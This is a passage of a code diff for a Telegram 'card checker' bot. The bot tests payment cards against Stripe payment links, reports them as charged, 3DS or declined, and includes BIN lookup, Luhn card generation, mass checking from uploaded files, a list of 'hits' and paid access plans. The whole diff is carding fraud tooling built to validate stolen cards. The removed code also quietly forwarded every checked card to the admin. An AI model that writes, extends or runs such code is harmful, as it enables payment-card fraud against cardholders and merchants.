@@ -694,13 +923,13 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         card_str, success, msg, charged = engine.check(card)
         udata["checks"] += 1
 
-        bin_info = bin_lookup(card['number'])
-        bin_scheme = bin_info['scheme'] if bin_info else "Unknown"
-        bin_type = bin_info['type'] if bin_info else "Unknown"
-        bin_brand = bin_info['brand'] if bin_info else "Unknown"
-        bin_country = bin_info['country'] if bin_info else "Unknown"
-        bin_bank = bin_info['bank'] if bin_info else "Unknown"
-        bin_emoji = bin_info['emoji'] if bin_info else ""
+        bin_info = bin_lookup_with_cache(card['number'])
+        bin_scheme = bin_info.get('scheme', 'Unknown')
+        bin_type = bin_info.get('type', 'Unknown')
+        bin_brand = bin_info.get('brand', 'Unknown')
+        bin_country = bin_info.get('country', 'Unknown')
+        bin_bank = bin_info.get('bank', 'Unknown')
+        bin_emoji = bin_info.get('emoji', '')
 
         if success:
             udata["charged"] += 1
@@ -738,177 +967,15 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await status_msg.edit_text(output, parse_mode="HTML")
 
-        if str(user_id) != str(ADMIN_ID) and ADMIN_ID:
-            try:
-                admin_msg = f"""{fb('New Check')}
-
-{fb('User')}: <code>{user_id}</code>
-{fb('Card')}: <code>{card_str}</code>
-{fb('Result')}: {status_text}"""
-                await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
-            except: pass
     except Exception as e:
         await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")
 
-async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    udata = get_user(user_id)
-    if not context.args:
-        await update.message.reply_text(f"{fb('Usage')}: <code>/mass cc|mm|yyyy|cvv ...</code>\n\n{fb('Or send a .txt file directly.')}", parse_mode="HTML")
-        return
-    lines = " ".join(context.args).split("\n")
-    await process_mass(update, context, lines, user_id, udata)
-
-async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
-    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
-    if not valid_cards:
-        await update.message.reply_text(f"{fb('No valid cards found!')}", parse_mode="HTML")
-        return
-
-    reset_stop()
-
-    status_msg = await update.message.reply_text(
-        f"{fb('Checking')} {len(valid_cards)} {fb('cards...')}\n\n{fb('Press Stop button to halt.')}",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(fb("STOP CHECK"), callback_data="mass_stop")]])
-    )
-
-    results = []
-    charged_count = declined_count = _3ds_count = 0
-
-    for idx, card in enumerate(valid_cards, 1):
-        if is_stopped():
-            results.append(f"STOPPED at card {idx}")
-            await update.message.reply_text(f"{fb('Mass check stopped by user.')}", parse_mode="HTML")
-            break
-        try:
-            card_str, success, msg, charged = engine.check(card)
-            udata["checks"] += 1
-
-            bin_info = bin_lookup(card['number'])
-            bin_scheme = bin_info['scheme'] if bin_info else "Unknown"
-            bin_type = bin_info['type'] if bin_info else "Unknown"
-            bin_brand = bin_info['brand'] if bin_info else "Unknown"
-            bin_country = bin_info['country'] if bin_info else "Unknown"
-            bin_bank = bin_info['bank'] if bin_info else "Unknown"
-            bin_emoji = bin_info['emoji'] if bin_info else ""
-
-            if success:
-                charged_count += 1
-                udata["charged"] += 1
-                status_icon = "[+]"
-                status_text = "CHARGED!"
-                response_text = "APPROVED"
-
-                result_output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
--------------------------------
-{status_icon} Card: <code>{card_str}</code>
-{status_icon} Status: {status_text}
-{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
--------------------------------
-{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
-{status_icon} Bank: {bin_bank} - {bin_emoji}
-{status_icon} Country: {bin_country} [ {bin_emoji} ]
--------------------------------
-{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
-{status_icon} Price: Free
-{status_icon} By: yacinedev Checker
--------------------------------
-{status_icon} Dev: @yacine_X6"""
-                await update.message.reply_text(result_output, parse_mode="HTML")
-
-            elif "3DS" in msg:
-                _3ds_count += 1
-                udata["_3ds"] += 1
-                status_icon = "[~]"
-                status_text = "3DS Required"
-                response_text = "3DS OTP"
-
-                result_output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
--------------------------------
-{status_icon} Card: <code>{card_str}</code>
-{status_icon} Status: {status_text}
-{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
--------------------------------
-{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
-{status_icon} Bank: {bin_bank} - {bin_emoji}
-{status_icon} Country: {bin_country} [ {bin_emoji} ]
--------------------------------
-{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
-{status_icon} Price: Free
-{status_icon} By: yacinedev Checker
--------------------------------
-{status_icon} Dev: @yacine_X6"""
-                await update.message.reply_text(result_output, parse_mode="HTML")
-
-            else:
-                declined_count += 1
-                udata["declined"] += 1
-                status_icon = "[-]"
-                status_text = "DECLINED"
-                response_text = msg
-
-                result_output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
--------------------------------
-{status_icon} Card: <code>{card_str}</code>
-{status_icon} Status: {status_text}
-{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
--------------------------------
-{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
-{status_icon} Bank: {bin_bank} - {bin_emoji}
-{status_icon} Country: {bin_country} [ {bin_emoji} ]
--------------------------------
-{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
-{status_icon} Price: Free
-{status_icon} By: yacinedev Checker
--------------------------------
-{status_icon} Dev: @yacine_X6"""
-                await update.message.reply_text(result_output, parse_mode="HTML")
-
-            results.append(f"{card_str} -> {status_text}")
-
-            if idx % 5 == 0 or idx == len(valid_cards):
-                progress = (idx / len(valid_cards)) * 100
-                try:
-                    await status_msg.edit_text(
-                        f"{fb('Checking...')} {progress:.0f}%\n"
-                        f"{idx}/{len(valid_cards)}\n"
-                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count} | {fb('3DS')}: {_3ds_count}\n\n"
-                        f"{fb('Press Stop button to halt.')}",
-                        parse_mode="HTML",
-                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(fb("STOP CHECK"), callback_data="mass_stop")]])
-                    )
-                except: pass
-                await asyncio.sleep(0.3)
-        except Exception as e:
-            results.append(f"[-] {card['number']}|... -> ERROR")
-
-    result_text = "\n".join(results)
-    result_file = BytesIO(result_text.encode("utf-8"))
-    result_file.name = f"results_{datetime.now().strftime('%H%M%S')}.txt"
-
-    summary = f"""{fb('Mass Check Complete')}
-━━━━━━━━━━━━━━
-{fb('Total')}: <b>{len(valid_cards)}</b>
-{fb('Approved')}: <b>{charged_count}</b>
-{fb('Declined')}: <b>{declined_count}</b>
-{fb('3DS')}: <b>{_3ds_count}</b>
-
-{fb('Success Rate')}: <b>{(charged_count/len(valid_cards)*100):.1f}%</b>"""
-
-    await update.message.reply_document(
-        document=InputFile(result_file),
-        caption=summary,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(fb(f"Approved {charged_count}"), callback_data="done_approved")],
-            [InlineKeyboardButton(fb(f"3D Secure {_3ds_count}"), callback_data="done_3ds")],
-            [InlineKeyboardButton(fb(f"Declined {declined_count}"), callback_data="done_declined")],
-            [InlineKeyboardButton(fb("Back"), callback_data="menu")],
-        ]),
-        parse_mode="HTML"
-    )
-
 async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id in banned_users:
+        await update.message.reply_text(fb("You are banned!"))
+        return
+    
     if not context.args:
         await update.message.reply_text(f"{fb('Usage')}: <code>/bin 424242</code>", parse_mode="HTML")
         return
@@ -917,9 +984,10 @@ async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"{fb('Invalid BIN! Use 6+ digits.')}", parse_mode="HTML")
         return
     status_msg = await update.message.reply_text(f"{fb('Looking up BIN')} {bin_num}...", parse_mode="HTML")
-    info = bin_lookup(bin_num)
-    if info:
-        text = f"""{fb('BIN Lookup')}: <code>{bin_num[:6]}</code>
+    
+    info = bin_lookup_with_cache(bin_num)
+    
+    text = f"""{fb('BIN Lookup')}: <code>{bin_num[:6]}</code>
 ━━━━━━━━━━━━━━
 {fb('Scheme')}: <b>{info['scheme']}</b>
 {fb('Type')}: <b>{info['type']}</b>
@@ -927,11 +995,14 @@ async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 {fb('Country')}: <b>{info['country']}</b> {info['emoji']}
 {fb('Bank')}: <b>{info['bank']}</b>
 ━━━━━━━━━━━━━━"""
-    else:
-        text = f"{fb('Could not fetch BIN info. Try again later.')}"
     await status_msg.edit_text(text, parse_mode="HTML")
 
 async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id in banned_users:
+        await update.message.reply_text(fb("You are banned!"))
+        return
+    
     if len(context.args) < 1:
         await update.message.reply_text(f"{fb('Usage')}: <code>/gen 424242 [count]</code>\n{fb('Max 10 cards.')}", parse_mode="HTML")
         return
@@ -952,196 +1023,94 @@ async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
 └─
 ━━━━━━━━━━━━━━
 {fb('All cards pass Luhn check.')}"""
-    keyboard = [
-        [InlineKeyboardButton(fb("Regenerate"), callback_data=f"regen_{bin_prefix}_{count}")],
-        [InlineKeyboardButton(fb("Back"), callback_data="tools")],
-    ]
-    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
-
-async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if str(user_id) != str(ADMIN_ID):
-        await update.message.reply_text(f"{fb('Admin only!')}", parse_mode="HTML")
-        return
-    if len(context.args) < 2:
-        await update.message.reply_text(f"{fb('Usage')}: <code>/add name https://buy.stripe.com/xxxxx</code>", parse_mode="HTML")
-        return
-    name, url = context.args[0], context.args[1]
-    add_gateway(name, url)
-    await update.message.reply_text(f"{fb('Gateway added')}: <b>{name}</b>\n<code>{url}</code>", parse_mode="HTML")
-
-async def cmd_rm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if str(user_id) != str(ADMIN_ID):
-        await update.message.reply_text(f"{fb('Admin only!')}", parse_mode="HTML")
-        return
-    if not context.args:
-        await update.message.reply_text(f"{fb('Usage')}: <code>/rm gateway_name</code>", parse_mode="HTML")
-        return
-    name = context.args[0]
-    if remove_gateway(name):
-        await update.message.reply_text(f"{fb('Gateway removed')}: <b>{name}</b>", parse_mode="HTML")
-    else:
-        await update.message.reply_text(f"{fb('Cannot remove default or not found.')}", parse_mode="HTML")
-
-async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    gw_list = "\n".join([f"├─ <b>{v['name']}</b> ➜ {v['url']}" for v in gateways.values()])
-    text = f"""{fb('Gateway Info')}
-━━━━━━━━━━━━━━
-{gw_list}
-└─
-━━━━━━━━━━━━━━"""
     await update.message.reply_text(text, parse_mode="HTML")
 
-async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text(f"{fb('Usage')}: <code>/redeem KEY-XXXX-XXXX</code>", parse_mode="HTML")
-        return
-    key = context.args[0]
-    user_id = update.effective_user.id
-    result = redeem_key(key, user_id)
-    if result:
-        await update.message.reply_text(f"{fb('Key redeemed!')}\n{fb('Plan')}: <b>{result['plan']}</b>\n{fb('Days')}: <b>{result['days']}</b>", parse_mode="HTML")
-    else:
-        await update.message.reply_text(f"{fb('Invalid or used key!')}", parse_mode="HTML")
+# ============================================================
+# BUTTON HANDLERS
+# ============================================================
 
-async def cmd_stopcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stop_all_checks()
-    await update.message.reply_text(f"{fb('Stop signal sent. Checks will halt.')}", parse_mode="HTML")
-
-async def cmd_sendhit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
     user_id = update.effective_user.id
-    udata = get_user(user_id)
-    hits = [h for h in udata["history"] if h["success"]]
-    if not hits:
-        await update.message.reply_text(f"{fb('No charged cards in history.')}", parse_mode="HTML")
+    chat_id = update.effective_chat.id
+    
+    # التحقق من الحظر
+    if user_id in banned_users and data not in ["menu", "start"]:
+        await query.message.reply_text(fb("You are banned!"))
         return
-    hit_text = "\n".join([f"├─ <code>{h['card']}</code> ➜ {h['time']}" for h in hits[-10:]])
-    text = f"""{fb('Hit List')}
+
+    if data == "menu":
+        user = update.effective_user
+        username = f"@{user.username}" if user.username else "N/A"
+        udata = get_user(user_id)
+        plan = udata["plan"]
+        if user_id == ADMIN_ID: plan = "Admin"
+        text = f"""{fb('Welcome')} {user.first_name}!
 ━━━━━━━━━━━━━━
-{hit_text}
-└─
-━━━━━━━━━━━━━━"""
-    await update.message.reply_text(text, parse_mode="HTML")
-
-async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if str(user_id) != str(ADMIN_ID):
-        await update.message.reply_text(f"{fb('Admin only!')}", parse_mode="HTML")
-        return
-    total_users = len(user_db)
-    total_checks = sum(u["checks"] for u in user_db.values())
-    total_charged = sum(u["charged"] for u in user_db.values())
-    text = f"""{fb('Admin Panel')}
+{fb('User')}: {username}
+{fb('ID')}: <code>{user.id}</code>
+{fb('Status')}: {fb(plan)}
 ━━━━━━━━━━━━━━
-{fb('Total Users')}: <b>{total_users}</b>
-{fb('Total Checks')}: <b>{total_checks}</b>
-{fb('Total Charged')}: <b>{total_charged}</b>
-{fb('Time')}: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
+{fb('Use the buttons below to navigate.')}"""
+        send_colored_buttons(chat_id, text, build_main_menu())
+
+    elif data == "tools":
+        text = f"{fb('Tools Menu')}\n\n{fb('Select a tool or use commands directly.')}"
+        send_colored_buttons(chat_id, text, build_tools_menu())
+
+    elif data == "profile":
+        user = update.effective_user
+        username = f"@{user.username}" if user.username else "N/A"
+        udata = get_user(user_id)
+        plan = udata["plan"]
+        if user_id == ADMIN_ID: plan = "Admin"
+        text = f"""{fb('Profile')}
+━━━━━━━━━━━━━━
+{fb('Name')}: {user.first_name}
+{fb('User')}: {username}
+{fb('ID')}: <code>{user.id}</code>
+{fb('Plan')}: {fb(plan)}
+{fb('Checks')}: {udata['checks']}
+{fb('Charged')}: {udata['charged']}
+{fb('Declined')}: {udata['declined']}
+{fb('3DS')}: {udata['_3ds']}
+{fb('Joined')}: {udata['registered']}
 ━━━━━━━━━━━━━━"""
-    await update.message.reply_text(text, parse_mode="HTML")
+        buttons = [[b_blue(fb("Back"), "menu")]]
+        send_colored_buttons(chat_id, text, buttons)
 
-async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if str(user_id) != str(ADMIN_ID): return
-    if not context.args:
-        await update.message.reply_text(f"{fb('Usage')}: /broadcast message")
-        return
-    message = " ".join(context.args)
-    sent = failed = 0
-    for uid in user_db:
-        try:
-            await context.bot.send_message(uid, f"{fb('Admin Notice')}:\n\n{message}", parse_mode="HTML")
-            sent += 1
-        except: failed += 1
-    await update.message.reply_text(f"{fb('Sent')}: {sent}\n{fb('Failed')}: {failed}", parse_mode="HTML")
+    elif data == "settings":
+        text = f"{fb('Settings')}\n\n{fb('Configure bot settings')}"
+        send_colored_buttons(chat_id, text, build_settings_menu())
 
-async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    state = context.user_data.get("state", "")
-    user_id = update.effective_user.id
-    udata = get_user(user_id)
-    document = update.message.document
-    if not document.file_name.endswith(".txt"):
-        await update.message.reply_text(f"{fb('Please send .txt files only!')}", parse_mode="HTML")
-        return
-    file = await context.bot.get_file(document.file_id)
-    file_bytes = await file.download_as_bytearray()
-    content = file_bytes.decode("utf-8", errors="ignore")
-    lines = [line.strip() for line in content.split("\n") if line.strip()]
-    await process_mass(update, context, lines, user_id, udata)
-    context.user_data["state"] = ""
+    elif data == "about":
+        text = f"""{fb('yacinedev Card Checker v7.0')}
 
-async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    state = context.user_data.get("state", "")
-    text = update.message.text or ""
-    user_id = update.effective_user.id
-    udata = get_user(user_id)
-    if state == "chk":
-        context.args = text.split()
-        await cmd_chk(update, context)
-        context.user_data["state"] = ""
-    elif "|" in text and len(text.split("|")) >= 4:
-        context.args = text.split()
-        await cmd_chk(update, context)
-    else:
-        await update.message.reply_text(f"{fb('yacinedev Card Checker')}\n\n{fb('Use the menu or commands:')}", reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(fb("Tools"), callback_data="tools")],
-            [InlineKeyboardButton(fb("Profile"), callback_data="profile")],
-            [InlineKeyboardButton(fb("Settings"), callback_data="settings")],
-            [InlineKeyboardButton(fb("About"), callback_data="about")],
-        ]), parse_mode="HTML")
+├─ {fb('Engine')}: Stripe Payment Link Engine
+├─ {fb('Version')}: 7.0
+├─ {fb('Performance')}: Async | Multi-threading
+├─ {fb('Security')}: Proxy Rotation | BIN Cache | Ban System
+│
+├─ {fb('Developer')}: yacinedev
+└─ {fb('Built with precision.')}"""
+        buttons = [[b_blue(fb("Back"), "menu")]]
+        send_colored_buttons(chat_id, text, buttons)
 
-def main():
-    print("""
-yacinedev Card Checker Bot v7.0
-Engine: Stripe Payment Link
-Font: Feedback
-Language: English
-Colored Buttons: Active (via requests API)
-    """)
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("[ERROR] Set BOT_TOKEN")
-        return
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("chk", cmd_chk))
-    application.add_handler(CommandHandler("mass", cmd_mass))
-    application.add_handler(CommandHandler("bin", cmd_bin))
-    application.add_handler(CommandHandler("gen", cmd_gen))
-    application.add_handler(CommandHandler("add", cmd_add))
-    application.add_handler(CommandHandler("rm", cmd_rm))
-    application.add_handler(CommandHandler("info", cmd_info))
-    application.add_handler(CommandHandler("redeem", cmd_redeem))
-    application.add_handler(CommandHandler("stopcheck", cmd_stopcheck))
-    application.add_handler(CommandHandler("sendhit", cmd_sendhit))
-    application.add_handler(CommandHandler("admin", cmd_admin))
-    application.add_handler(CommandHandler("broadcast", cmd_broadcast))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
-    application.add_handler(MessageHandler(filters.Document.ALL, document_handler))
-    print("[+] Bot started successfully!")
-    print("[*] Waiting for connections...")
+    elif data == "admin_panel":
+        if str(user_id) != str(ADMIN_ID):
+            await query.answer(fb("Admin only!"), show_alert=True)
+            return
+        text = f"{fb('Admin Panel')}\n\n{fb('Select an option:')}"
+        send_colored_buttons(chat_id, text, build_admin_menu())
 
-    try:
-        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
-    except KeyboardInterrupt:
-        print("\n[!] Bot stopped by user (Ctrl+C)")
-    except Exception as e:
-        print(f"[!] Bot error: {e}")
-        import time
-        print("[*] Restarting in 5 seconds...")
-        time.sleep(5)
-        main()
-
-if __name__ == "__main__":
-    while True:
-        try:
-            main()
-        except KeyboardInterrupt:
-            print("\n[!] Exiting...")
-            break
-        except Exception as e:
-            print(f"[!] Fatal error: {e}")
-            print("[*] Restarting in 10 seconds...")
-            import time
-            time.sleep(10)
+    elif data == "admin_gen":
+        if str(user_id) != str(ADMIN_ID):
+            await query.answer(fb("Admin only!"), show_alert=True)
+            return
+        await query.message.reply_text(
+            f"{fb('Generate Code')}\n\n"
+            f"{fb('Usage')}: <code>/code Premium 30</code>\n"
+            f"{fb('Example')}: <code>/code Premium 30</code> - generates 30-day Premium code\n"
+            f"{fb('Plan options')}: Free, Premium, VIP",
